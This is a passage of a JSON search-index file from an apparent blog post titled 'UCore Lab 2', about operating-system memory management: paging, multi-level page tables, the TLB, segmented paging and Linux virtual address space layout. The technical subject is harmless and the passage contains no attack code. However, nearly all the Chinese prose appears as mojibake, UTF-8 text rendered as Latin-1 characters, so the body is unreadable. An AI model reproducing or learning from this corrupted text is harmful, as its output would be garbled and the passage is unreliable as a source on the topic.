è½½åˆ°ç‰©ç†å†…å­˜é‡Œï¼Œè€Œæ˜¯åªæœ‰åœ¨ç¨‹åºè¿è¡Œä¸­ï¼Œéœ€è¦ç”¨åˆ°å¯¹åº”è™šæ‹Ÿå†…å­˜é¡µé‡Œé¢çš„æŒ‡ä»¤å’Œæ•°æ®æ—¶ï¼Œå†åŠ è½½åˆ°ç‰©ç†å†…å­˜é‡Œé¢å»ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-2/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#å†…å­˜åˆ†é¡µ"},{"categories":["Pwning"],"content":"åˆ†é¡µæœºåˆ¶ä¸‹è™šæ‹Ÿåœ°å€å’Œç‰©ç†åœ°å€çš„æ˜ å°„åœ¨åˆ†é¡µæœºåˆ¶ä¸‹ï¼Œè™šæ‹Ÿåœ°å€åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œé¡µå·å’Œé¡µå†…åç§»ã€‚é¡µå·ä½œä¸ºé¡µè¡¨çš„ç´¢å¼•ï¼Œé¡µè¡¨åŒ…å«ç‰©ç†é¡µæ¯é¡µæ‰€åœ¨ç‰©ç†å†…å­˜çš„åŸºåœ°å€ï¼Œè¿™ä¸ªåŸºåœ°å€ä¸é¡µå†…åç§»çš„ç»„åˆå°±å½¢æˆäº†ç‰©ç†å†…å­˜åœ°å€ï¼Œè§ä¸‹å›¾ã€‚ å†…å­˜åˆ†é¡µå¯»å€æ€»ç»“ä¸€ä¸‹ï¼Œå¯¹äºä¸€ä¸ªå†…å­˜åœ°å€è½¬æ¢ï¼Œå…¶å®å°±æ˜¯è¿™æ ·ä¸‰ä¸ªæ­¥éª¤ï¼š æŠŠè™šæ‹Ÿå†…å­˜åœ°å€ï¼Œåˆ‡åˆ†æˆé¡µå·å’Œåç§»é‡ï¼› æ ¹æ®é¡µå·ï¼Œä»é¡µè¡¨é‡Œé¢ï¼ŒæŸ¥è¯¢å¯¹åº”çš„ç‰©ç†é¡µå·ï¼› ç›´æ¥æ‹¿ç‰©ç†é¡µå·ï¼ŒåŠ ä¸Šå‰é¢çš„åç§»é‡ï¼Œå°±å¾—åˆ°äº†ç‰©ç†å†…å­˜åœ°å€ã€‚ ä¸‹é¢ä¸¾ä¸ªä¾‹å­ï¼Œè™šæ‹Ÿå†…å­˜ä¸­çš„é¡µé€šè¿‡é¡µè¡¨æ˜ å°„ä¸ºäº†ç‰©ç†å†…å­˜ä¸­çš„é¡µï¼Œå¦‚ä¸‹å›¾ï¼š è™šæ‹Ÿé¡µä¸ç‰©ç†é¡µçš„æ˜ å°„è¿™çœ‹èµ·æ¥ä¼¼ä¹æ²¡ä»€ä¹ˆæ¯›ç—…ï¼Œä½†æ˜¯æ”¾åˆ°å®é™…ä¸­æ“ä½œç³»ç»Ÿï¼Œè¿™ç§ç®€å•çš„åˆ†é¡µæ˜¯è‚¯å®šæ˜¯ä¼šæœ‰é—®é¢˜çš„ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-2/:1:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#åˆ†é¡µæœºåˆ¶ä¸‹è™šæ‹Ÿåœ°å€å’Œç‰©ç†åœ°å€çš„æ˜ å°„"},{"categories":["Pwning"],"content":"åˆ†é¡µçš„ç¼ºé™·æœ‰ç©ºé—´ä¸Šçš„ç¼ºé™·ã€‚å› ä¸ºæ“ä½œç³»ç»Ÿæ˜¯å¯ä»¥åŒæ—¶è¿è¡Œéå¸¸å¤šçš„è¿›ç¨‹çš„ï¼Œé‚£è¿™ä¸å°±æ„å‘³ç€é¡µè¡¨ä¼šéå¸¸çš„åºå¤§ã€‚åœ¨ 32 ä½çš„ç¯å¢ƒä¸‹ï¼Œè™šæ‹Ÿåœ°å€ç©ºé—´å…±æœ‰ 4GBï¼Œå‡è®¾ä¸€ä¸ªé¡µçš„å¤§å°æ˜¯ 4KBï¼ˆ2^12ï¼‰ï¼Œé‚£ä¹ˆå°±éœ€è¦å¤§çº¦ 100 ä¸‡ ï¼ˆ2^20ï¼‰ ä¸ªé¡µï¼Œæ¯ä¸ªã€Œé¡µè¡¨é¡¹ã€éœ€è¦ 4 ä¸ªå­—èŠ‚å¤§å°æ¥å­˜å‚¨ï¼Œé‚£ä¹ˆæ•´ä¸ª 4GB ç©ºé—´çš„æ˜ å°„å°±éœ€è¦æœ‰ 4MB çš„å†…å­˜æ¥å­˜å‚¨é¡µè¡¨ã€‚è¿™ 4MB å¤§å°çš„é¡µè¡¨ï¼Œçœ‹èµ·æ¥ä¹Ÿä¸æ˜¯å¾ˆå¤§ã€‚ä½†æ˜¯è¦çŸ¥é“æ¯ä¸ªè¿›ç¨‹éƒ½æ˜¯æœ‰è‡ªå·±çš„è™šæ‹Ÿåœ°å€ç©ºé—´çš„ï¼Œä¹Ÿå°±è¯´éƒ½æœ‰è‡ªå·±çš„é¡µè¡¨ã€‚é‚£ä¹ˆï¼Œ100 ä¸ªè¿›ç¨‹çš„è¯ï¼Œå°±éœ€è¦ 400MB çš„å†…å­˜æ¥å­˜å‚¨é¡µè¡¨ï¼Œè¿™æ˜¯éå¸¸å¤§çš„å†…å­˜äº†ï¼Œæ›´åˆ«è¯´ 64 ä½çš„ç¯å¢ƒäº†ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-2/:2:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#åˆ†é¡µçš„ç¼ºé™·"},{"categories":["Pwning"],"content":"å¤šçº§é¡µè¡¨è¦è§£å†³ä¸Šé¢çš„é—®é¢˜ï¼Œå°±éœ€è¦é‡‡ç”¨çš„æ˜¯ä¸€ç§å«ä½œå¤šçº§é¡µè¡¨ï¼ˆMulti-Level Page Tableï¼‰çš„è§£å†³æ–¹æ¡ˆã€‚åœ¨å‰é¢æˆ‘ä»¬çŸ¥é“äº†ï¼Œå¯¹äºå•é¡µè¡¨çš„å®ç°æ–¹å¼ï¼Œåœ¨ 32 ä½å’Œé¡µå¤§å° 4KB çš„ç¯å¢ƒä¸‹ï¼Œä¸€ä¸ªè¿›ç¨‹çš„é¡µè¡¨éœ€è¦è£…ä¸‹ 100 å¤šä¸‡ä¸ªã€Œé¡µè¡¨é¡¹ã€ï¼Œå¹¶ä¸”æ¯ä¸ªé¡µè¡¨é¡¹æ˜¯å ç”¨ 4 å­—èŠ‚å¤§å°çš„ï¼Œäºæ˜¯ç›¸å½“äºæ¯ä¸ªé¡µè¡¨éœ€å ç”¨ 4MB å¤§å°çš„ç©ºé—´ã€‚æˆ‘ä»¬æŠŠè¿™ä¸ª 100 å¤šä¸‡ä¸ªã€Œé¡µè¡¨é¡¹ã€çš„å•çº§é¡µè¡¨å†åˆ†é¡µï¼Œå°†é¡µè¡¨ï¼ˆä¸€çº§é¡µè¡¨ï¼‰åˆ†ä¸º 1024 ä¸ªé¡µè¡¨ï¼ˆäºŒçº§é¡µè¡¨ï¼‰ï¼Œæ¯ä¸ªè¡¨ï¼ˆäºŒçº§é¡µè¡¨ï¼‰ä¸­åŒ…å« 1024 ä¸ªã€Œé¡µè¡¨é¡¹ã€ï¼Œå½¢æˆäºŒçº§åˆ†é¡µã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ä½ å¯èƒ½ä¼šé—®ï¼Œåˆ†äº†äºŒçº§è¡¨ï¼Œæ˜ å°„ 4GB åœ°å€ç©ºé—´å°±éœ€è¦ 4KBï¼ˆä¸€çº§é¡µè¡¨ï¼‰+ 4MBï¼ˆäºŒçº§é¡µè¡¨ï¼‰çš„å†…å­˜ï¼Œè¿™æ ·å ç”¨ç©ºé—´ä¸æ˜¯æ›´å¤§äº†å—ï¼Ÿ å½“ç„¶å¦‚æœ 4GB çš„è™šæ‹Ÿåœ°å€å…¨éƒ¨éƒ½æ˜ å°„åˆ°äº†ç‰©ç†å†…ä¸Šçš„ï¼ŒäºŒçº§åˆ†é¡µå ç”¨ç©ºé—´ç¡®å®æ˜¯æ›´å¤§äº†ï¼Œä½†æ˜¯ï¼Œæˆ‘ä»¬å¾€å¾€ä¸ä¼šä¸ºä¸€ä¸ªè¿›ç¨‹åˆ†é…é‚£ä¹ˆå¤šå†…å­˜ã€‚å…¶å®æˆ‘ä»¬åº”è¯¥æ¢ä¸ªè§’åº¦æ¥çœ‹é—®é¢˜ï¼Œè¿˜è®°å¾—è®¡ç®—æœºç»„æˆåŸç†é‡Œé¢æ— å¤„ä¸åœ¨çš„å±€éƒ¨æ€§åŸç†ä¹ˆï¼Ÿæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ 4GB çš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œè€Œæ˜¾ç„¶å¯¹äºå¤§å¤šæ•°ç¨‹åºæ¥è¯´ï¼Œå…¶ä½¿ç”¨åˆ°çš„ç©ºé—´è¿œæœªè¾¾åˆ° 4GBï¼Œå› ä¸ºä¼šå­˜åœ¨éƒ¨åˆ†å¯¹åº”çš„é¡µè¡¨é¡¹éƒ½æ˜¯ç©ºçš„ï¼Œæ ¹æœ¬æ²¡æœ‰åˆ†é…ï¼Œå¯¹äºå·²åˆ†é…çš„é¡µè¡¨é¡¹ï¼Œå¦‚æœå­˜åœ¨æœ€è¿‘ä¸€å®šæ—¶é—´æœªè®¿é—®çš„é¡µè¡¨ï¼Œåœ¨ç‰©ç†å†…å­˜ç´§å¼ çš„æƒ…å†µä¸‹ï¼Œæ“ä½œç³»ç»Ÿä¼šå°†é¡µé¢æ¢å‡ºåˆ°ç¡¬ç›˜ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸ä¼šå ç”¨ç‰©ç†å†…å­˜ã€‚å¦‚æœä½¿ç”¨äº†äºŒçº§åˆ†é¡µï¼Œä¸€çº§é¡µè¡¨å°±å¯ä»¥è¦†ç›–æ•´ä¸ª 4GB è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œä½†å¦‚æœæŸä¸ªä¸€çº§é¡µè¡¨çš„é¡µè¡¨é¡¹æ²¡æœ‰è¢«ç”¨åˆ°ï¼Œä¹Ÿå°±ä¸éœ€è¦åˆ›å»ºè¿™ä¸ªé¡µè¡¨é¡¹å¯¹åº”çš„äºŒçº§é¡µè¡¨äº†ï¼Œå³å¯ä»¥åœ¨éœ€è¦æ—¶æ‰åˆ›å»ºäºŒçº§é¡µè¡¨ã€‚åšä¸ªç®€å•çš„è®¡ç®—ï¼Œå‡è®¾åªæœ‰ 20% çš„ä¸€çº§é¡µè¡¨é¡¹è¢«ç”¨åˆ°äº†ï¼Œé‚£ä¹ˆé¡µè¡¨å ç”¨çš„å†…å­˜ç©ºé—´å°±åªæœ‰ 4KBï¼ˆä¸€çº§é¡µè¡¨ï¼‰ + 20% * 4MBï¼ˆäºŒçº§é¡µè¡¨ï¼‰= 0.804MBï¼Œè¿™å¯¹æ¯”å•çº§é¡µè¡¨çš„ 4MB æ˜¯ä¸æ˜¯ä¸€ä¸ªå·¨å¤§çš„èŠ‚çº¦ï¼Ÿé‚£ä¹ˆä¸ºä»€ä¹ˆä¸åˆ†çº§çš„é¡µè¡¨å°±åšä¸åˆ°è¿™æ ·èŠ‚çº¦å†…å­˜å‘¢ï¼Ÿæˆ‘ä»¬ä»é¡µè¡¨çš„æ€§è´¨æ¥çœ‹ï¼Œä¿å­˜åœ¨å†…å­˜ä¸­çš„é¡µè¡¨æ‰¿æ‹…çš„èŒè´£æ˜¯å°†è™šæ‹Ÿåœ°å€ç¿»è¯‘æˆç‰©ç†åœ°å€ã€‚å‡å¦‚è™šæ‹Ÿåœ°å€åœ¨é¡µè¡¨ä¸­æ‰¾ä¸åˆ°å¯¹åº”çš„é¡µè¡¨é¡¹ï¼Œè®¡ç®—æœºç³»ç»Ÿå°±ä¸èƒ½å·¥ä½œäº†ã€‚æ‰€ä»¥é¡µè¡¨ä¸€å®šè¦è¦†ç›–å…¨éƒ¨è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œä¸åˆ†çº§çš„é¡µè¡¨å°±éœ€è¦æœ‰ 100 å¤šä¸‡ä¸ªé¡µè¡¨é¡¹æ¥æ˜ å°„ï¼Œè€ŒäºŒçº§åˆ†é¡µåˆ™åªéœ€è¦ 1024 ä¸ªé¡µè¡¨é¡¹ï¼ˆæ­¤æ—¶ä¸€çº§é¡µè¡¨è¦†ç›–åˆ°äº†å…¨éƒ¨è™šæ‹Ÿåœ°å€ç©ºé—´ï¼ŒäºŒçº§é¡µè¡¨åœ¨éœ€è¦æ—¶åˆ›å»ºï¼‰ã€‚æˆ‘ä»¬æŠŠäºŒçº§åˆ†é¡µå†æ¨å¹¿åˆ°å¤šçº§é¡µè¡¨ï¼Œå°±ä¼šå‘ç°é¡µè¡¨å ç”¨çš„å†…å­˜ç©ºé—´æ›´å°‘äº†ï¼Œè¿™ä¸€åˆ‡éƒ½è¦å½’åŠŸäºå¯¹å±€éƒ¨æ€§åŸç†çš„å……åˆ†åº”ç”¨ã€‚å¯¹äº 64 ä½çš„ç³»ç»Ÿï¼Œä¸¤çº§åˆ†é¡µè‚¯å®šä¸å¤Ÿäº†ï¼Œå°±å˜æˆäº†å››çº§ç›®å½•ï¼Œåˆ†åˆ«æ˜¯ï¼š å…¨å±€é¡µç›®å½•é¡¹ PGDï¼ˆPage Global Directoryï¼‰ï¼› ä¸Šå±‚é¡µç›®å½•é¡¹ PUDï¼ˆPage Upper Directoryï¼‰ï¼› ä¸­é—´é¡µç›®å½•é¡¹ PMDï¼ˆPage Middle Directoryï¼‰ï¼› é¡µè¡¨é¡¹ PTEï¼ˆPage Table Entryï¼‰ï¼› ","date":"2021-07-10","objectID":"/ucore-lab-2/:3:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#å¤šçº§é¡µè¡¨"},{"categories":["Pwning"],"content":"TLBå¤šçº§é¡µè¡¨è™½ç„¶è§£å†³äº†ç©ºé—´ä¸Šçš„é—®é¢˜ï¼Œä½†æ˜¯è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€çš„è½¬æ¢å°±å¤šäº†å‡ é“è½¬æ¢çš„å·¥åºï¼Œè¿™æ˜¾ç„¶å°±é™ä½äº†è¿™ä¿©åœ°å€è½¬æ¢çš„é€Ÿåº¦ï¼Œä¹Ÿå°±æ˜¯å¸¦æ¥äº†æ—¶é—´ä¸Šçš„å¼€é”€ã€‚ç¨‹åºæ˜¯æœ‰å±€éƒ¨æ€§çš„ï¼Œå³åœ¨ä¸€æ®µæ—¶é—´å†…ï¼Œæ•´ä¸ªç¨‹åºçš„æ‰§è¡Œä»…é™äºç¨‹åºä¸­çš„æŸä¸€éƒ¨åˆ†ã€‚ç›¸åº”åœ°ï¼Œæ‰§è¡Œæ‰€è®¿é—®çš„å­˜å‚¨ç©ºé—´ä¹Ÿå±€é™äºæŸä¸ªå†…å­˜åŒºåŸŸã€‚ ç¨‹åºçš„å±€éƒ¨æ€§æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‰¹æ€§ï¼ŒæŠŠæœ€å¸¸è®¿é—®çš„å‡ ä¸ªé¡µè¡¨é¡¹å­˜å‚¨åˆ°è®¿é—®é€Ÿåº¦æ›´å¿«çš„ç¡¬ä»¶ï¼Œäºæ˜¯è®¡ç®—æœºç§‘å­¦å®¶ä»¬ï¼Œå°±åœ¨ CPU èŠ¯ç‰‡ä¸­ï¼ŒåŠ å…¥äº†ä¸€ä¸ªä¸“é—¨å­˜æ”¾ç¨‹åºæœ€å¸¸è®¿é—®çš„é¡µè¡¨é¡¹çš„ Cacheï¼Œè¿™ä¸ª Cache å°±æ˜¯ TLBï¼ˆTranslation Lookaside Bufferï¼‰ ï¼Œé€šå¸¸ç§°ä¸ºé¡µè¡¨ç¼“å­˜ã€è½¬å€æ—è·¯ç¼“å­˜ã€å¿«è¡¨ç­‰ã€‚ åœ°å€è½¬æ¢åœ¨ CPU èŠ¯ç‰‡é‡Œé¢ï¼Œå°è£…äº†å†…å­˜ç®¡ç†å•å…ƒï¼ˆMemory Management Unitï¼‰èŠ¯ç‰‡ï¼Œå®ƒç”¨æ¥å®Œæˆåœ°å€è½¬æ¢å’Œ TLB çš„è®¿é—®ä¸äº¤äº’ã€‚æœ‰äº† TLB åï¼Œé‚£ä¹ˆ CPU åœ¨å¯»å€æ—¶ï¼Œä¼šå…ˆæŸ¥ TLBï¼Œå¦‚æœæ²¡æ‰¾åˆ°ï¼Œæ‰ä¼šç»§ç»­æŸ¥å¸¸è§„çš„é¡µè¡¨ã€‚TLB çš„å‘½ä¸­ç‡å…¶å®æ˜¯å¾ˆé«˜çš„ï¼Œå› ä¸ºç¨‹åºæœ€å¸¸è®¿é—®çš„é¡µå°±é‚£ä¹ˆå‡ ä¸ªã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-2/:4:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#tlb"},{"categories":["Pwning"],"content":"æ®µé¡µå¼å†…å­˜ç®¡ç†å†…å­˜åˆ†æ®µå’Œå†…å­˜åˆ†é¡µå¹¶ä¸æ˜¯å¯¹ç«‹çš„ï¼Œå®ƒä»¬æ˜¯å¯ä»¥ç»„åˆèµ·æ¥åœ¨åŒä¸€ä¸ªç³»ç»Ÿä¸­ä½¿ç”¨çš„ï¼Œé‚£ä¹ˆç»„åˆèµ·æ¥åï¼Œé€šå¸¸ç§°ä¸ºæ®µé¡µå¼å†…å­˜ç®¡ç†ã€‚ æ®µé¡µå¼åœ°å€ç©ºé—´æ®µé¡µå¼å†…å­˜ç®¡ç†å®ç°çš„æ–¹å¼ï¼š å…ˆå°†ç¨‹åºåˆ’åˆ†ä¸ºå¤šä¸ªæœ‰é€»è¾‘æ„ä¹‰çš„æ®µï¼Œä¹Ÿå°±æ˜¯å‰é¢æåˆ°çš„åˆ†æ®µæœºåˆ¶ï¼› æ¥ç€å†æŠŠæ¯ä¸ªæ®µåˆ’åˆ†ä¸ºå¤šä¸ªé¡µï¼Œä¹Ÿå°±æ˜¯å¯¹åˆ†æ®µåˆ’åˆ†å‡ºæ¥çš„è¿ç»­ç©ºé—´ï¼Œå†åˆ’åˆ†å›ºå®šå¤§å°çš„é¡µï¼› è¿™æ ·ï¼Œåœ°å€ç»“æ„å°±ç”±æ®µå·ã€æ®µå†…é¡µå·å’Œé¡µå†…ä½ç§»ä¸‰éƒ¨åˆ†ç»„æˆã€‚ç”¨äºæ®µé¡µå¼åœ°å€å˜æ¢çš„æ•°æ®ç»“æ„æ˜¯æ¯ä¸€ä¸ªç¨‹åºä¸€å¼ æ®µè¡¨ï¼Œæ¯ä¸ªæ®µåˆå»ºç«‹ä¸€å¼ é¡µè¡¨ï¼Œæ®µè¡¨ä¸­çš„åœ°å€æ˜¯é¡µè¡¨çš„èµ·å§‹åœ°å€ï¼Œè€Œé¡µè¡¨ä¸­çš„åœ°å€åˆ™ä¸ºæŸé¡µçš„ç‰©ç†é¡µå·ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š æ®µé¡µå¼ç®¡ç†ä¸­çš„æ®µè¡¨ã€é¡µè¡¨ä¸å†…å­˜çš„å…³ç³»æ®µé¡µå¼åœ°å€å˜æ¢ä¸­è¦å¾—åˆ°ç‰©ç†åœ°å€é¡»ç»è¿‡ä¸‰æ¬¡å†…å­˜è®¿é—®ï¼š ç¬¬ä¸€æ¬¡è®¿é—®æ®µè¡¨ï¼Œå¾—åˆ°é¡µè¡¨èµ·å§‹åœ°å€ï¼› ç¬¬äºŒæ¬¡è®¿é—®é¡µè¡¨ï¼Œå¾—åˆ°ç‰©ç†é¡µå·ï¼› ç¬¬ä¸‰æ¬¡å°†ç‰©ç†é¡µå·ä¸é¡µå†…ä½ç§»ç»„åˆï¼Œå¾—åˆ°ç‰©ç†åœ°å€ã€‚ å¯ç”¨è½¯ã€ç¡¬ä»¶ç›¸ç»“åˆçš„æ–¹æ³•å®ç°æ®µé¡µå¼åœ°å€å˜æ¢ï¼Œè¿™æ ·è™½ç„¶å¢åŠ äº†ç¡¬ä»¶æˆæœ¬å’Œç³»ç»Ÿå¼€é”€ï¼Œä½†æé«˜äº†å†…å­˜çš„åˆ©ç”¨ç‡ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-2/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#æ®µé¡µå¼å†…å­˜ç®¡ç†"},{"categories":["Pwning"],"content":"Linux å†…å­˜ç®¡ç†é‚£ä¹ˆï¼ŒLinux æ“ä½œç³»ç»Ÿé‡‡ç”¨äº†å“ªç§æ–¹å¼æ¥ç®¡ç†å†…å­˜å‘¢ï¼Ÿ åœ¨å›ç­”è¿™ä¸ªé—®é¢˜å‰ï¼Œæˆ‘ä»¬å¾—å…ˆçœ‹çœ‹ Intel å¤„ç†å™¨çš„å‘å±•å†å²ã€‚ æ—©æœŸ Intel çš„å¤„ç†å™¨ä» 80286 å¼€å§‹ä½¿ç”¨çš„æ˜¯æ®µå¼å†…å­˜ç®¡ç†ã€‚ä½†æ˜¯å¾ˆå¿«å‘ç°ï¼Œå…‰æœ‰æ®µå¼å†…å­˜ç®¡ç†è€Œæ²¡æœ‰é¡µå¼å†…å­˜ç®¡ç†æ˜¯ä¸å¤Ÿçš„ï¼Œè¿™ä¼šä½¿å®ƒçš„ X86 ç³»åˆ—ä¼šå¤±å»å¸‚åœºçš„ç«äº‰åŠ›ã€‚å› æ­¤ï¼Œåœ¨ä¸ä¹…ä»¥åçš„ 80386 ä¸­å°±å®ç°äº†å¯¹é¡µå¼å†…å­˜ç®¡ç†ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ80386 é™¤äº†å®Œæˆå¹¶å®Œå–„ä» 80286 å¼€å§‹çš„æ®µå¼å†…å­˜ç®¡ç†çš„åŒæ—¶è¿˜å®ç°äº†é¡µå¼å†…å­˜ç®¡ç†ã€‚ä½†æ˜¯è¿™ä¸ª 80386 çš„é¡µå¼å†…å­˜ç®¡ç†è®¾è®¡æ—¶ï¼Œæ²¡æœ‰ç»•å¼€æ®µå¼å†…å­˜ç®¡ç†ï¼Œè€Œæ˜¯å»ºç«‹åœ¨æ®µå¼å†…å­˜ç®¡ç†çš„åŸºç¡€ä¸Šï¼Œè¿™å°±æ„å‘³ç€ï¼Œ**é¡µå¼å†…å­˜ç®¡ç†çš„ä½œç”¨æ˜¯åœ¨ç”±æ®µå¼å†…å­˜ç®¡ç†æ‰€æ˜ å°„è€Œæˆçš„çš„åœ°å€ä¸Šå†åŠ ä¸Šä¸€å±‚åœ°å€æ˜ å°„ã€‚**ç”±äºæ­¤æ—¶æ®µå¼å†…å­˜ç®¡ç†æ˜ å°„è€Œæˆçš„åœ°å€ä¸å†æ˜¯â€œç‰©ç†åœ°å€â€äº†ï¼ŒIntel å°±ç§°ä¹‹ä¸ºâ€œçº¿æ€§åœ°å€â€ï¼ˆä¹Ÿç§°è™šæ‹Ÿåœ°å€ï¼‰ã€‚äºæ˜¯ï¼Œæ®µå¼å†…å­˜ç®¡ç†å…ˆå°†é€»è¾‘åœ°å€æ˜ å°„æˆçº¿æ€§åœ°å€ï¼Œç„¶åå†ç”±é¡µå¼å†…å­˜ç®¡ç†å°†çº¿æ€§åœ°å€æ˜ å°„æˆç‰©ç†åœ°å€ã€‚ Intel X86 é€»è¾‘åœ°å€è§£æè¿‡ç¨‹è¿™é‡Œè¯´æ˜ä¸‹é€»è¾‘åœ°å€å’Œçº¿æ€§åœ°å€ï¼š ç¨‹åºæ‰€ä½¿ç”¨çš„åœ°å€ï¼Œé€šå¸¸æ˜¯æ²¡è¢«æ®µå¼å†…å­˜ç®¡ç†æ˜ å°„çš„åœ°å€ï¼Œç§°ä¸ºé€»è¾‘åœ°å€ï¼› é€šè¿‡æ®µå¼å†…å­˜ç®¡ç†æ˜ å°„çš„åœ°å€ï¼Œç§°ä¸ºçº¿æ€§åœ°å€ï¼Œä¹Ÿå«è™šæ‹Ÿåœ°å€ï¼› é€»è¾‘åœ°å€æ˜¯ã€Œæ®µå¼å†…å­˜ç®¡ç†ã€è½¬æ¢å‰çš„åœ°å€ï¼Œçº¿æ€§åœ°å€åˆ™æ˜¯ã€Œé¡µå¼å†…å­˜ç®¡ç†ã€è½¬æ¢å‰çš„åœ°å€ã€‚ Linux å†…å­˜ä¸»è¦é‡‡ç”¨çš„æ˜¯é¡µå¼å†…å­˜ç®¡ç†ï¼Œä½†åŒæ—¶ä¹Ÿä¸å¯é¿å…åœ°æ¶‰åŠäº†æ®µæœºåˆ¶ã€‚è¿™ä¸»è¦æ˜¯ä¸Šé¢ Intel å¤„ç†å™¨å‘å±•å†å²å¯¼è‡´çš„ï¼Œå› ä¸º Intel X86 CPU ä¸€å¾‹å¯¹ç¨‹åºä¸­ä½¿ç”¨çš„åœ°å€å…ˆè¿›è¡Œæ®µå¼æ˜ å°„ï¼Œç„¶åæ‰èƒ½è¿›è¡Œé¡µå¼æ˜ å°„ã€‚æ—¢ç„¶ CPU çš„ç¡¬ä»¶ç»“æ„æ˜¯è¿™æ ·ï¼ŒLinux å†…æ ¸ä¹Ÿåªå¥½æœä» Intel çš„é€‰æ‹©ã€‚ä½†æ˜¯äº‹å®ä¸Šï¼ŒLinux å†…æ ¸æ‰€é‡‡å–çš„åŠæ³•æ˜¯ä½¿æ®µå¼æ˜ å°„çš„è¿‡ç¨‹å®é™…ä¸Šä¸èµ·ä»€ä¹ˆä½œç”¨ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œâ€œä¸Šæœ‰æ”¿ç­–ï¼Œä¸‹æœ‰å¯¹ç­–â€ï¼Œè‹¥æƒ¹ä¸èµ·å°±èº²ç€èµ°ã€‚Linux ç³»ç»Ÿä¸­çš„æ¯ä¸ªæ®µéƒ½æ˜¯ä» 0 åœ°å€å¼€å§‹çš„æ•´ä¸ª 4GB è™šæ‹Ÿç©ºé—´ï¼ˆ32 ä½ç¯å¢ƒä¸‹ï¼‰ï¼Œä¹Ÿå°±æ˜¯æ‰€æœ‰çš„æ®µçš„èµ·å§‹åœ°å€éƒ½æ˜¯ä¸€æ ·çš„ã€‚è¿™æ„å‘³ç€ï¼ŒLinux ç³»ç»Ÿä¸­çš„ä»£ç ï¼ŒåŒ…æ‹¬æ“ä½œç³»ç»Ÿæœ¬èº«çš„ä»£ç å’Œåº”ç”¨ç¨‹åºä»£ç ï¼Œæ‰€é¢å¯¹çš„åœ°å€ç©ºé—´éƒ½æ˜¯çº¿æ€§åœ°å€ç©ºé—´ï¼ˆè™šæ‹Ÿåœ°å€ï¼‰ï¼Œè¿™ç§åšæ³•ç›¸å½“äºå±è”½äº†å¤„ç†å™¨ä¸­çš„é€»è¾‘åœ°å€æ¦‚å¿µï¼Œæ®µåªè¢«ç”¨äºè®¿é—®æ§åˆ¶å’Œå†…å­˜ä¿æŠ¤ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-2/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#linux-å†…å­˜ç®¡ç†"},{"categories":["Pwning"],"content":"Linux çš„è™šæ‹Ÿåœ°å€ç©ºé—´åˆ†å¸ƒï¼Ÿåœ¨ Linux æ“ä½œç³»ç»Ÿä¸­ï¼Œè™šæ‹Ÿåœ°å€ç©ºé—´çš„å†…éƒ¨åˆè¢«åˆ†ä¸ºå†…æ ¸ç©ºé—´å’Œç”¨æˆ·ç©ºé—´ä¸¤éƒ¨åˆ†ï¼Œä¸åŒä½æ•°çš„ç³»ç»Ÿï¼Œåœ°å€ç©ºé—´çš„èŒƒå›´ä¹Ÿä¸åŒã€‚æ¯”å¦‚æœ€å¸¸è§çš„ 32 ä½å’Œ 64 ä½ç³»ç»Ÿï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š ç”¨æˆ·ç©ºé—´ä¸å†…å­˜ç©ºé—´é€šè¿‡è¿™é‡Œå¯ä»¥çœ‹å‡ºï¼š 32 ä½ç³»ç»Ÿçš„å†…æ ¸ç©ºé—´å ç”¨ 1Gï¼Œä½äºæœ€é«˜å¤„ï¼Œå‰©ä¸‹çš„ 3G æ˜¯ç”¨æˆ·ç©ºé—´ï¼› 64 ä½ç³»ç»Ÿçš„å†…æ ¸ç©ºé—´å’Œç”¨æˆ·ç©ºé—´éƒ½æ˜¯ 128Tï¼Œåˆ†åˆ«å æ®æ•´ä¸ªå†…å­˜ç©ºé—´çš„æœ€é«˜å’Œæœ€ä½å¤„ï¼Œå‰©ä¸‹çš„ä¸­é—´éƒ¨åˆ†æ˜¯æœªå®šä¹‰çš„ã€‚ å†æ¥è¯´è¯´ï¼Œå†…æ ¸ç©ºé—´ä¸ç”¨æˆ·ç©ºé—´çš„åŒºåˆ«ï¼š è¿›ç¨‹åœ¨ç”¨æˆ·æ€æ—¶ï¼Œåªèƒ½è®¿é—®ç”¨æˆ·ç©ºé—´å†…å­˜ï¼› åªæœ‰è¿›å…¥å†…æ ¸æ€åï¼Œæ‰å¯ä»¥è®¿é—®å†…æ ¸ç©ºé—´çš„å†…å­˜ï¼› è™½ç„¶æ¯ä¸ªè¿›ç¨‹éƒ½å„è‡ªæœ‰ç‹¬ç«‹çš„è™šæ‹Ÿå†…å­˜ï¼Œä½†æ˜¯æ¯ä¸ªè™šæ‹Ÿå†…å­˜ä¸­çš„å†…æ ¸åœ°å€ï¼Œå…¶å®å…³è”çš„éƒ½æ˜¯ç›¸åŒçš„ç‰©ç†å†…å­˜ã€‚è¿™æ ·ï¼Œè¿›ç¨‹åˆ‡æ¢åˆ°å†…æ 